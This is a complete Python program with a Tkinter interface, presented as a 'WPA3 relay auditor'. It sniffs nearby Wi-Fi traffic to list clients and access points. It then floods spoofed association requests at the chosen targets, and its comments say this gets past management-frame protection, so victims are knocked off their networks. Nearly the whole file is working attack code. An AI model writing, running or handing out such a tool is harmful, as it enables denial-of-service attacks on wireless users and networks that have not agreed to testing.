import os, sys, time, threading
from scapy.all import *
import tkinter as tk
from tkinter import ttk

class RelayAuditor:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {} # {MAC: {"BSSID": bssid, "SSID": ssid, "CH": ch}}
        self.running = True
        self.firing = False
        
        # Initial Hardware Lockdown
        self.lock_hardware()
        
        # --- UI Setup ---
        self.root = tk.Tk()
        self.root.title("Surgical WPA3 Relay Auditor")
        self.root.geometry("1000x800")
        self.root.configure(bg="#050505")

        # Search Logic
        search_frame = tk.Frame(self.root, bg="#050505")
        search_frame.pack(pady=10, fill="x", padx=20)
        
        tk.Label(search_frame, text="SEARCH:", fg="#00FF41", bg="#050505", font=("Courier", 10)).pack(side="left")
        self.search_var = tk.StringVar()
        self.search_var.trace("w", lambda name, index, mode: self.update_ui())
        self.search_entry = tk.Entry(search_frame, textvariable=self.search_var, bg="#111", fg="#00FF41", insertbackground="white")
        self.search_entry.pack(side="left", fill="x", expand=True, padx=10)

        # Main Listbox (Treeview for better search/sorting)
        self.tree = ttk.Treeview(self.root, columns=("MAC", "SSID", "BSSID", "CH"), show="headings")
        self.tree.heading("MAC", text="CLIENT MAC")
        self.tree.heading("SSID", text="SSID / NETWORK")
        self.tree.heading("BSSID", text="BSSID")
        self.tree.heading("CH", text="CH")
        self.tree.column("CH", width=50)
        self.tree.pack(padx=20, pady=10, fill="both", expand=True)

        # Controls
        ctrl_frame = tk.Frame(self.root, bg="#050505")
        ctrl_frame.pack(pady=20)
        
        self.btn_text = tk.StringVar(value="ENGAGE STATE DESYNC")
        tk.Button(ctrl_frame, textvariable=self.btn_text, command=self.toggle_attack, 
                  bg="#aa5500", fg="white", width=30, height=2, font=("Arial", 10, "bold")).pack()
        
        tk.Button(self.root, text="REPAIR WIFI & EXIT", command=self.shutdown, 
                  bg="#333", fg="#ff4444", width=25).pack(pady=10)

        self.status_var = tk.StringVar(value="Status: Monitoring Airwaves...")
        tk.Label(self.root, textvariable=self.status_var, fg="#888", bg="#050505").pack()

        # Threads
        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner, daemon=True).start()

    def lock_hardware(self):
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type monitor && sudo ip link set {self.iface} up")

    def hopper(self):
        ch = 1
        while self.running:
            if not self.firing:
                os.system(f"sudo iw dev {self.iface} set channel {ch}")
                self.current_ch = ch
                ch = (ch % 13) + 1
                time.sleep(0.5)
            else:
                time.sleep(1)

    def scanner(self):
        def callback(pkt):
            if not self.firing and pkt.haslayer(Dot11):
                # Sniffing for both Beacons (SSID) and Data (Clients)
                if pkt.type == 0 and pkt.subtype == 8: # Beacon
                    ssid = pkt.info.decode(errors="ignore") or "Hidden"
                    bssid = pkt.addr3
                    for mac, data in self.discovered.items():
                        if data["BSSID"] == bssid:
                            data["SSID"] = ssid
                
                if pkt.addr2 and pkt.addr3 and pkt.addr2 != pkt.addr3:
                    mac, bssid = pkt.addr2, pkt.addr3
                    if mac not in self.discovered and ":" in mac:
                        self.discovered[mac] = {"BSSID": bssid, "SSID": "Scanning...", "CH": self.current_ch}
                        self.root.after(0, self.update_ui)
        sniff(iface=self.iface, prn=callback, store=0)

    def update_ui(self):
        search_term = self.search_var.get().lower()
        for i in self.tree.get_children():
            self.tree.delete(i)
        
        for mac, info in self.discovered.items():
            if search_term in mac.lower() or search_term in info["SSID"].lower() or search_term in info["BSSID"].lower():
                self.tree.insert("", "end", values=(mac, info["SSID"], info["BSSID"], info["CH"]))

    def toggle_attack(self):
        if not self.firing:
            selected = self.tree.selection()
            if not selected: return
            self.firing = True
            self.btn_text.set("STOPPING DESYNC...")
            targets = [self.tree.item(i)["values"] for i in selected]
            threading.Thread(target=self.relay_desync_loop, args=(targets,), daemon=True).start()
        else:
            self.firing = False
            self.btn_text.set("ENGAGE STATE DESYNC")

    def relay_desync_loop(self, targets):
        while self.firing:
            for mac, ssid, bssid, ch in targets:
                if not self.firing: break
                
                # Logic: Switch to correct channel for this specific relay path
                os.system(f"sudo iw dev {self.iface} set channel {ch}")
                
                # Logic: Association Request Flood (Bypasses PMF Cryptography)
                # We are spoofing the client asking to "start over"
                base = RadioTap()/Dot11(addr1=bssid, addr2=mac, addr3=bssid)
                pkt = base/Dot11AssoReq() 
                
                try:
                    sendp(pkt, iface=self.iface, count=50, inter=0.001, verbose=False)
                except:
                    self.firing = False
                    break
            time.sleep(0.05)
        self.status_var.set("Status: Monitoring Airwaves...")

    def shutdown(self):
        self.running = False
        self.firing = False
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up && sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    RelayAuditor(sys.argv[1]).root.mainloop()
